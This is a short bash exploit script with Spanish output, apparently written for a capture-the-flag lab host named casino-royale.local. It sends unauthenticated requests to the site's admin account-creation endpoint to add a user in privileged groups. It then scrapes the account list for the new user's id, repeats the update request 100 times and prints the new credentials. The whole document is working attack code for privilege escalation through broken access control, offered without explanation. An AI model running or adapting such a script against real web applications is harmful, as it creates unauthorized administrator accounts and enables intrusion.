email='testing%40testing.com' # request email
email2='testing@testing.com' #Grepeable email
name='testing'
password='testing123'

(
url="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create"

data="emailAddress=$email&verifiedEmail=verified&username=$name&newPassword=$password&confirmPassword=$password&userGroups%5B%5D=34&userGroups%5B%5D=33&memo=&status=1&formAction=submit"


curl -s -X POST $url -d $data &>/dev/null

sleep 2

id=$(curl -s -X GET "http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/list" | grep -B 1 "$email2" | head -n 1 | awk '{print $1}' | sed 's/<td>//g' | sed 's/<\/td>//g' | tr -d '[:space:]')

sleep 2

for i in $(seq 0 100); do
    url1="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/update&id=$id"
    data1="emailAddress=$email&verifiedEmail=verified&username=$name&newPassword=$password&confirmPassword=$password&userGroups%5B%5D=34&userGroups%5B%5D=33&memo=&status=1&formAction=submit&id=$id"
    url1="$url1"
    curl -s -X POST $url1 -d $data1 
done
 

) > /dev/null 

echo "Usuario privilegiado creado"
echo "Nombre: $name"
echo "Email: $email2"
echo "Contraseña: $password"